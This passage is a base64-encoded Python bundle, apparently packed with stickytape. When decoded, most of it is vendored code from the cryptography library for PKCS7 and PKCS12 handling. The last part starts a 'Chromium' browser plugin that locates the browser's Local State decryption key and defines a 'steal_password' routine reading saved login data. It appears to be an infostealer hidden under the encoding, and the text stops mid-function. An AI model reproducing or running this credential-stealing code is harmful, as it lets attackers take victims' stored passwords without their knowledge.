AiUEtDUzdTaWduYXR1cmVCdWlsZGVyIjpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShcclxuICAgICAgICAgICAgaGFzaF9hbGdvcml0aG0sXHJcbiAgICAgICAgICAgIChcclxuICAgICAgICAgICAgICAgIGhhc2hlcy5TSEExLFxyXG4gICAgICAgICAgICAgICAgaGFzaGVzLlNIQTIyNCxcclxuICAgICAgICAgICAgICAgIGhhc2hlcy5TSEEyNTYsXHJcbiAgICAgICAgICAgICAgICBoYXNoZXMuU0hBMzg0LFxyXG4gICAgICAgICAgICAgICAgaGFzaGVzLlNIQTUxMixcclxuICAgICAgICAgICAgKSxcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiaGFzaF9hbGdvcml0aG0gbXVzdCBiZSBvbmUgb2YgaGFzaGVzLlNIQTEsIFNIQTIyNCwgIlxyXG4gICAgICAgICAgICAgICAgIlNIQTI1NiwgU0hBMzg0LCBvciBTSEE1MTIiXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShjZXJ0aWZpY2F0ZSwgeDUwOS5DZXJ0aWZpY2F0ZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiY2VydGlmaWNhdGUgbXVzdCBiZSBhIHg1MDkuQ2VydGlmaWNhdGUiKVxyXG5cclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShcclxuICAgICAgICAgICAgcHJpdmF0ZV9rZXksIChyc2EuUlNBUHJpdmF0ZUtleSwgZWMuRWxsaXB0aWNDdXJ2ZVByaXZhdGVLZXkpXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJPbmx5IFJTQSAmIEVDIGtleXMgYXJlIHN1cHBvcnRlZCBhdCB0aGlzIHRpbWUuIilcclxuXHJcbiAgICAgICAgcmV0dXJuIFBLQ1M3U2lnbmF0dXJlQnVpbGRlcihcclxuICAgICAgICAgICAgc2VsZi5fZGF0YSxcclxuICAgICAgICAgICAgc2VsZi5fc2lnbmVycyArIFsoY2VydGlmaWNhdGUsIHByaXZhdGVfa2V5LCBoYXNoX2FsZ29yaXRobSldLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgYWRkX2NlcnRpZmljYXRlKFxyXG4gICAgICAgIHNlbGYsIGNlcnRpZmljYXRlOiB4NTA5LkNlcnRpZmljYXRlXHJcbiAgICApIC0+ICJQS0NTN1NpZ25hdHVyZUJ1aWxkZXIiOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGNlcnRpZmljYXRlLCB4NTA5LkNlcnRpZmljYXRlKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJjZXJ0aWZpY2F0ZSBtdXN0IGJlIGEgeDUwOS5DZXJ0aWZpY2F0ZSIpXHJcblxyXG4gICAgICAgIHJldHVybiBQS0NTN1NpZ25hdHVyZUJ1aWxkZXIoXHJcbiAgICAgICAgICAgIHNlbGYuX2RhdGEsIHNlbGYuX3NpZ25lcnMsIHNlbGYuX2FkZGl0aW9uYWxfY2VydHMgKyBbY2VydGlmaWNhdGVdXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBzaWduKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZW5jb2Rpbmc6IHNlcmlhbGl6YXRpb24uRW5jb2RpbmcsXHJcbiAgICAgICAgb3B0aW9uczogdHlwaW5nLkl0ZXJhYmxlW1BLQ1M3T3B0aW9uc10sXHJcbiAgICAgICAgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmUsXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgIGlmIGxlbihzZWxmLl9zaWduZXJzKSA9PSAwOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJNdXN0IGhhdmUgYXQgbGVhc3Qgb25lIHNpZ25lciIpXHJcbiAgICAgICAgaWYgc2VsZi5fZGF0YSBpcyBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJZb3UgbXVzdCBhZGQgZGF0YSB0byBzaWduIilcclxuICAgICAgICBvcHRpb25zID0gbGlzdChvcHRpb25zKVxyXG4gICAgICAgIGlmIG5vdCBhbGwoaXNpbnN0YW5jZSh4LCBQS0NTN09wdGlvbnMpIGZvciB4IGluIG9wdGlvbnMpOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJvcHRpb25zIG11c3QgYmUgZnJvbSB0aGUgUEtDUzdPcHRpb25zIGVudW0iKVxyXG4gICAgICAgIGlmIGVuY29kaW5nIG5vdCBpbiAoXHJcbiAgICAgICAgICAgIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuUEVNLFxyXG4gICAgICAgICAgICBzZXJpYWxpemF0aW9uLkVuY29kaW5nLkRFUixcclxuICAgICAgICAgICAgc2VyaWFsaXphdGlvbi5FbmNvZGluZy5TTUlNRSxcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIk11c3QgYmUgUEVNLCBERVIsIG9yIFNNSU1FIGZyb20gdGhlIEVuY29kaW5nIGVudW0iXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgIyBUZXh0IGlzIGEgbWVhbmluZ2xlc3Mgb3B0aW9uIHVubGVzcyBpdCBpcyBhY2NvbXBhbmllZCBieVxyXG4gICAgICAgICMgRGV0YWNoZWRTaWduYXR1cmVcclxuICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgIFBLQ1M3T3B0aW9ucy5UZXh0IGluIG9wdGlvbnNcclxuICAgICAgICAgICAgYW5kIFBLQ1M3T3B0aW9ucy5EZXRhY2hlZFNpZ25hdHVyZSBub3QgaW4gb3B0aW9uc1xyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiV2hlbiBwYXNzaW5nIHRoZSBUZXh0IG9wdGlvbiB5b3UgbXVzdCBhbHNvIHBhc3MgIlxyXG4gICAgICAgICAgICAgICAgIkRldGFjaGVkU2lnbmF0dXJlIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIGlmIFBLQ1M3T3B0aW9ucy5UZXh0IGluIG9wdGlvbnMgYW5kIGVuY29kaW5nIGluIChcclxuICAgICAgICAgICAgc2VyaWFsaXphdGlvbi5FbmNvZGluZy5ERVIsXHJcbiAgICAgICAgICAgIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuUEVNLFxyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiVGhlIFRleHQgb3B0aW9uIGlzIG9ubHkgYXZhaWxhYmxlIGZvciBTTUlNRSBzZXJpYWxpemF0aW9uIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgICMgTm8gYXR0cmlidXRlcyBpbXBsaWVzIG5vIGNhcGFiaWxpdGllcyBzbyB3ZVwnbGwgZXJyb3IgaWYgeW91IHRyeSB0b1xyXG4gICAgICAgICMgcGFzcyBib3RoLlxyXG4gICAgICAgIGlmIChcclxuICAgICAgICAgICAgUEtDUzdPcHRpb25zLk5vQXR0cmlidXRlcyBpbiBvcHRpb25zXHJcbiAgICAgICAgICAgIGFuZCBQS0NTN09wdGlvbnMuTm9DYXBhYmlsaXRpZXMgaW4gb3B0aW9uc1xyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiTm9BdHRyaWJ1dGVzIGlzIGEgc3VwZXJzZXQgb2YgTm9DYXBhYmlsaXRpZXMuIERvIG5vdCBwYXNzICJcclxuICAgICAgICAgICAgICAgICJib3RoIHZhbHVlcy4iXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgKFxyXG4gICAgICAgICAgICBiYWNrZW5kIGFzIG9zc2wsXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICByZXR1cm4gb3NzbC5wa2NzN19zaWduKHNlbGYsIGVuY29kaW5nLCBvcHRpb25zKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9wcmltaXRpdmVzL3NlcmlhbGl6YXRpb24vcGtjczEyLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuaW1wb3J0IHR5cGluZ1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IHg1MDlcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IHNlcmlhbGl6YXRpb25cclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYyBpbXBvcnQgKFxyXG4gICAgZHNhLFxyXG4gICAgZWMsXHJcbiAgICBlZDI1NTE5LFxyXG4gICAgZWQ0NDgsXHJcbiAgICByc2EsXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYy50eXBlcyBpbXBvcnQgKFxyXG4gICAgUFJJVkFURV9LRVlfVFlQRVMsXHJcbilcclxuXHJcblxyXG5fQUxMT1dFRF9QS0NTMTJfVFlQRVMgPSB0eXBpbmcuVW5pb25bXHJcbiAgICByc2EuUlNBUHJpdmF0ZUtleSxcclxuICAgIGRzYS5EU0FQcml2YXRlS2V5LFxyXG4gICAgZWMuRWxsaXB0aWNDdXJ2ZVByaXZhdGVLZXksXHJcbiAgICBlZDI1NTE5LkVkMjU1MTlQcml2YXRlS2V5LFxyXG4gICAgZWQ0NDguRWQ0NDhQcml2YXRlS2V5LFxyXG5dXHJcblxyXG5cclxuY2xhc3MgUEtDUzEyQ2VydGlmaWNhdGU6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBjZXJ0OiB4NTA5LkNlcnRpZmljYXRlLFxyXG4gICAgICAgIGZyaWVuZGx5X25hbWU6IHR5cGluZy5PcHRpb25hbFtieXRlc10sXHJcbiAgICApOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGNlcnQsIHg1MDkuQ2VydGlmaWNhdGUpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkV4cGVjdGluZyB4NTA5LkNlcnRpZmljYXRlIG9iamVjdCIpXHJcbiAgICAgICAgaWYgZnJpZW5kbHlfbmFtZSBpcyBub3QgTm9uZSBhbmQgbm90IGlzaW5zdGFuY2UoZnJpZW5kbHlfbmFtZSwgYnl0ZXMpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoImZyaWVuZGx5X25hbWUgbXVzdCBiZSBieXRlcyBvciBOb25lIilcclxuICAgICAgICBzZWxmLl9jZXJ0ID0gY2VydFxyXG4gICAgICAgIHNlbGYuX2ZyaWVuZGx5X25hbWUgPSBmcmllbmRseV9uYW1lXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgZnJpZW5kbHlfbmFtZShzZWxmKSAtPiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9mcmllbmRseV9uYW1lXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY2VydGlmaWNhdGUoc2VsZikgLT4geDUwOS5DZXJ0aWZpY2F0ZTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fY2VydFxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgUEtDUzEyQ2VydGlmaWNhdGUpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgc2VsZi5jZXJ0aWZpY2F0ZSA9PSBvdGhlci5jZXJ0aWZpY2F0ZVxyXG4gICAgICAgICAgICBhbmQgc2VsZi5mcmllbmRseV9uYW1lID09IG90aGVyLmZyaWVuZGx5X25hbWVcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaCgoc2VsZi5jZXJ0aWZpY2F0ZSwgc2VsZi5mcmllbmRseV9uYW1lKSlcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPFBLQ1MxMkNlcnRpZmljYXRlKHt9LCBmcmllbmRseV9uYW1lPXshcn0pPiIuZm9ybWF0KFxyXG4gICAgICAgICAgICBzZWxmLmNlcnRpZmljYXRlLCBzZWxmLmZyaWVuZGx5X25hbWVcclxuICAgICAgICApXHJcblxyXG5cclxuY2xhc3MgUEtDUzEyS2V5QW5kQ2VydGlmaWNhdGVzOlxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAga2V5OiB0eXBpbmcuT3B0aW9uYWxbUFJJVkFURV9LRVlfVFlQRVNdLFxyXG4gICAgICAgIGNlcnQ6IHR5cGluZy5PcHRpb25hbFtQS0NTMTJDZXJ0aWZpY2F0ZV0sXHJcbiAgICAgICAgYWRkaXRpb25hbF9jZXJ0czogdHlwaW5nLkxpc3RbUEtDUzEyQ2VydGlmaWNhdGVdLFxyXG4gICAgKTpcclxuICAgICAgICBpZiBrZXkgaXMgbm90IE5vbmUgYW5kIG5vdCBpc2luc3RhbmNlKFxyXG4gICAgICAgICAgICBrZXksXHJcbiAgICAgICAgICAgIChcclxuICAgICAgICAgICAgICAgIHJzYS5SU0FQcml2YXRlS2V5LFxyXG4gICAgICAgICAgICAgICAgZHNhLkRTQVByaXZhdGVLZXksXHJcbiAgICAgICAgICAgICAgICBlYy5FbGxpcHRpY0N1cnZlUHJpdmF0ZUtleSxcclxuICAgICAgICAgICAgICAgIGVkMjU1MTkuRWQyNTUxOVByaXZhdGVLZXksXHJcbiAgICAgICAgICAgICAgICBlZDQ0OC5FZDQ0OFByaXZhdGVLZXksXHJcbiAgICAgICAgICAgICksXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIktleSBtdXN0IGJlIFJTQSwgRFNBLCBFbGxpcHRpY0N1cnZlLCBFRDI1NTE5LCBvciBFRDQ0OCJcclxuICAgICAgICAgICAgICAgICIgcHJpdmF0ZSBrZXksIG9yIE5vbmUuIlxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgaWYgY2VydCBpcyBub3QgTm9uZSBhbmQgbm90IGlzaW5zdGFuY2UoY2VydCwgUEtDUzEyQ2VydGlmaWNhdGUpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoImNlcnQgbXVzdCBiZSBhIFBLQ1MxMkNlcnRpZmljYXRlIG9iamVjdCBvciBOb25lIilcclxuICAgICAgICBpZiBub3QgYWxsKFxyXG4gICAgICAgICAgICBpc2luc3RhbmNlKGFkZF9jZXJ0LCBQS0NTMTJDZXJ0aWZpY2F0ZSlcclxuICAgICAgICAgICAgZm9yIGFkZF9jZXJ0IGluIGFkZGl0aW9uYWxfY2VydHNcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiYWxsIHZhbHVlcyBpbiBhZGRpdGlvbmFsX2NlcnRzIG11c3QgYmUgUEtDUzEyQ2VydGlmaWNhdGUiXHJcbiAgICAgICAgICAgICAgICAiIG9iamVjdHMiXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBzZWxmLl9rZXkgPSBrZXlcclxuICAgICAgICBzZWxmLl9jZXJ0ID0gY2VydFxyXG4gICAgICAgIHNlbGYuX2FkZGl0aW9uYWxfY2VydHMgPSBhZGRpdGlvbmFsX2NlcnRzXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYga2V5KHNlbGYpIC0+IHR5cGluZy5PcHRpb25hbFtQUklWQVRFX0tFWV9UWVBFU106XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2tleVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNlcnQoc2VsZikgLT4gdHlwaW5nLk9wdGlvbmFsW1BLQ1MxMkNlcnRpZmljYXRlXTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fY2VydFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGFkZGl0aW9uYWxfY2VydHMoc2VsZikgLT4gdHlwaW5nLkxpc3RbUEtDUzEyQ2VydGlmaWNhdGVdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9hZGRpdGlvbmFsX2NlcnRzXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBQS0NTMTJLZXlBbmRDZXJ0aWZpY2F0ZXMpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgc2VsZi5rZXkgPT0gb3RoZXIua2V5XHJcbiAgICAgICAgICAgIGFuZCBzZWxmLmNlcnQgPT0gb3RoZXIuY2VydFxyXG4gICAgICAgICAgICBhbmQgc2VsZi5hZGRpdGlvbmFsX2NlcnRzID09IG90aGVyLmFkZGl0aW9uYWxfY2VydHNcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaCgoc2VsZi5rZXksIHNlbGYuY2VydCwgdHVwbGUoc2VsZi5hZGRpdGlvbmFsX2NlcnRzKSkpXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICBmbXQgPSAoXHJcbiAgICAgICAgICAgICI8UEtDUzEyS2V5QW5kQ2VydGlmaWNhdGVzKGtleT17fSwgY2VydD17fSwgYWRkaXRpb25hbF9jZXJ0cz17fSk+IlxyXG4gICAgICAgIClcclxuICAgICAgICByZXR1cm4gZm10LmZvcm1hdChzZWxmLmtleSwgc2VsZi5jZXJ0LCBzZWxmLmFkZGl0aW9uYWxfY2VydHMpXHJcblxyXG5cclxuZGVmIGxvYWRfa2V5X2FuZF9jZXJ0aWZpY2F0ZXMoXHJcbiAgICBkYXRhOiBieXRlcyxcclxuICAgIHBhc3N3b3JkOiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdLFxyXG4gICAgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmUsXHJcbikgLT4gdHlwaW5nLlR1cGxlW1xyXG4gICAgdHlwaW5nLk9wdGlvbmFsW1BSSVZBVEVfS0VZX1RZUEVTXSxcclxuICAgIHR5cGluZy5PcHRpb25hbFt4NTA5LkNlcnRpZmljYXRlXSxcclxuICAgIHR5cGluZy5MaXN0W3g1MDkuQ2VydGlmaWNhdGVdLFxyXG5dOlxyXG4gICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgYmFja2VuZCBhcyBvc3NsXHJcblxyXG4gICAgcmV0dXJuIG9zc2wubG9hZF9rZXlfYW5kX2NlcnRpZmljYXRlc19mcm9tX3BrY3MxMihkYXRhLCBwYXNzd29yZClcclxuXHJcblxyXG5kZWYgbG9hZF9wa2NzMTIoXHJcbiAgICBkYXRhOiBieXRlcyxcclxuICAgIHBhc3N3b3JkOiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdLFxyXG4gICAgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmUsXHJcbikgLT4gUEtDUzEyS2V5QW5kQ2VydGlmaWNhdGVzOlxyXG4gICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgYmFja2VuZCBhcyBvc3NsXHJcblxyXG4gICAgcmV0dXJuIG9zc2wubG9hZF9wa2NzMTIoZGF0YSwgcGFzc3dvcmQpXHJcblxyXG5cclxuX1BLQ1MxMl9DQVNfVFlQRVMgPSB0eXBpbmcuVW5pb25bXHJcbiAgICB4NTA5LkNlcnRpZmljYXRlLFxyXG4gICAgUEtDUzEyQ2VydGlmaWNhdGUsXHJcbl1cclxuXHJcblxyXG5kZWYgc2VyaWFsaXplX2tleV9hbmRfY2VydGlmaWNhdGVzKFxyXG4gICAgbmFtZTogdHlwaW5nLk9wdGlvbmFsW2J5dGVzXSxcclxuICAgIGtleTogdHlwaW5nLk9wdGlvbmFsW19BTExPV0VEX1BLQ1MxMl9UWVBFU10sXHJcbiAgICBjZXJ0OiB0eXBpbmcuT3B0aW9uYWxbeDUwOS5DZXJ0aWZpY2F0ZV0sXHJcbiAgICBjYXM6IHR5cGluZy5PcHRpb25hbFt0eXBpbmcuSXRlcmFibGVbX1BLQ1MxMl9DQVNfVFlQRVNdXSxcclxuICAgIGVuY3J5cHRpb25fYWxnb3JpdGhtOiBzZXJpYWxpemF0aW9uLktleVNlcmlhbGl6YXRpb25FbmNyeXB0aW9uLFxyXG4pIC0+IGJ5dGVzOlxyXG4gICAgaWYga2V5IGlzIG5vdCBOb25lIGFuZCBub3QgaXNpbnN0YW5jZShcclxuICAgICAgICBrZXksXHJcbiAgICAgICAgKFxyXG4gICAgICAgICAgICByc2EuUlNBUHJpdmF0ZUtleSxcclxuICAgICAgICAgICAgZHNhLkRTQVByaXZhdGVLZXksXHJcbiAgICAgICAgICAgIGVjLkVsbGlwdGljQ3VydmVQcml2YXRlS2V5LFxyXG4gICAgICAgICAgICBlZDI1NTE5LkVkMjU1MTlQcml2YXRlS2V5LFxyXG4gICAgICAgICAgICBlZDQ0OC5FZDQ0OFByaXZhdGVLZXksXHJcbiAgICAgICAgKSxcclxuICAgICk6XHJcbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAiS2V5IG11c3QgYmUgUlNBLCBEU0EsIEVsbGlwdGljQ3VydmUsIEVEMjU1MTksIG9yIEVENDQ4IlxyXG4gICAgICAgICAgICAiIHByaXZhdGUga2V5LCBvciBOb25lLiJcclxuICAgICAgICApXHJcbiAgICBpZiBjZXJ0IGlzIG5vdCBOb25lIGFuZCBub3QgaXNpbnN0YW5jZShjZXJ0LCB4NTA5LkNlcnRpZmljYXRlKTpcclxuICAgICAgICByYWlzZSBUeXBlRXJyb3IoImNlcnQgbXVzdCBiZSBhIGNlcnRpZmljYXRlIG9yIE5vbmUiKVxyXG5cclxuICAgIGlmIGNhcyBpcyBub3QgTm9uZTpcclxuICAgICAgICBjYXMgPSBsaXN0KGNhcylcclxuICAgICAgICBpZiBub3QgYWxsKFxyXG4gICAgICAgICAgICBpc2luc3RhbmNlKFxyXG4gICAgICAgICAgICAgICAgdmFsLFxyXG4gICAgICAgICAgICAgICAgKFxyXG4gICAgICAgICAgICAgICAgICAgIHg1MDkuQ2VydGlmaWNhdGUsXHJcbiAgICAgICAgICAgICAgICAgICAgUEtDUzEyQ2VydGlmaWNhdGUsXHJcbiAgICAgICAgICAgICAgICApLFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGZvciB2YWwgaW4gY2FzXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJhbGwgdmFsdWVzIGluIGNhcyBtdXN0IGJlIGNlcnRpZmljYXRlcyIpXHJcblxyXG4gICAgaWYgbm90IGlzaW5zdGFuY2UoXHJcbiAgICAgICAgZW5jcnlwdGlvbl9hbGdvcml0aG0sIHNlcmlhbGl6YXRpb24uS2V5U2VyaWFsaXphdGlvbkVuY3J5cHRpb25cclxuICAgICk6XHJcbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAiS2V5IGVuY3J5cHRpb24gYWxnb3JpdGhtIG11c3QgYmUgYSAiXHJcbiAgICAgICAgICAgICJLZXlTZXJpYWxpemF0aW9uRW5jcnlwdGlvbiBpbnN0YW5jZSJcclxuICAgICAgICApXHJcblxyXG4gICAgaWYga2V5IGlzIE5vbmUgYW5kIGNlcnQgaXMgTm9uZSBhbmQgbm90IGNhczpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJZb3UgbXVzdCBzdXBwbHkgYXQgbGVhc3Qgb25lIG9mIGtleSwgY2VydCwgb3IgY2FzIilcclxuXHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBiYWNrZW5kXHJcblxyXG4gICAgcmV0dXJuIGJhY2tlbmQuc2VyaWFsaXplX2tleV9hbmRfY2VydGlmaWNhdGVzX3RvX3BrY3MxMihcclxuICAgICAgICBuYW1lLCBrZXksIGNlcnQsIGNhcywgZW5jcnlwdGlvbl9hbGdvcml0aG1cclxuICAgIClcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ3BsdWdpbnMvYnJvd3NlcnMvQ2hyb21pdW0ucHknLCBiImZyb20gYXN5bmNpbyBpbXBvcnQgVGFzaywgY3JlYXRlX3Rhc2tcclxuZnJvbSB0eXBpbmcgaW1wb3J0IExpc3RcclxuZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zIGltcG9ydCBzY2FuZGlyLCBta2RpclxyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGpvaW4sIGlzZGlyLCBpc2ZpbGUsIHNwbGl0XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHlmaWxlLCBjb3B5dHJlZSwgX2hhbmRsZV90YXNrX3Jlc3VsdFxyXG5mcm9tIHBhdGhfc2VhcmNoIGltcG9ydCBzZWFyY2hfcGF0aHNcclxuaW1wb3J0IGFpb3NxbGl0ZVxyXG5mcm9tIC5kZWNyeXB0IGltcG9ydCBEZWNyeXB0b3JcclxuZnJvbSB0aW1lIGltcG9ydCB0aW1lXHJcbmZyb20gcGF0aHMgaW1wb3J0IFRFTVBcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSBhaW9maWxlcyBpbXBvcnQgb3BlblxyXG5cclxuXHJcblxyXG5jbGFzcyBDaHJvbWl1bShQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcbiAgICAgICAgc2VsZi5kZWNyeXB0b3IgPSBOb25lXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBzZXRfZGVjcnlwdG9yKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGxvY2FsX3N0YXRlX2ZvbGRlcnMgPSB7XHJcbiAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJyksXHJcbiAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgbG9jYWxfc3RhdGVzID0gW11cclxuICAgICAgICBhc3luYyBmb3IgaSBpbiBzZWFyY2hfcGF0aHMobG9jYWxfc3RhdGVfZm9sZGVycywgeydMb2NhbCBTdGF0ZSd9KTpcclxuICAgICAgICAgICAgbG9jYWxfc3RhdGVzLmFwcGVuZChpKVxyXG5cclxuICAgICAgICBpZiBsb2NhbF9zdGF0ZXM6XHJcbiAgICAgICAgICAgIGxvY2FsX3N0YXRlX3BhdGggPSBsb2NhbF9zdGF0ZXNbMF1cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBsb2NhbF9zdGF0ZV9wYXRoID0gTm9uZVxyXG5cclxuICAgICAgICBzZWxmLmRlY3J5cHRvciA9IERlY3J5cHRvcihsb2NhbF9zdGF0ZV9wYXRoKVxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgc3RlYWxfcGFzc3dvcmQoc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICByb3dzID0gW11cclxuXHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihyb290X3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFtdXHJcblxyXG4gICAgICAgICAgICBsb2dpbl9kYXRh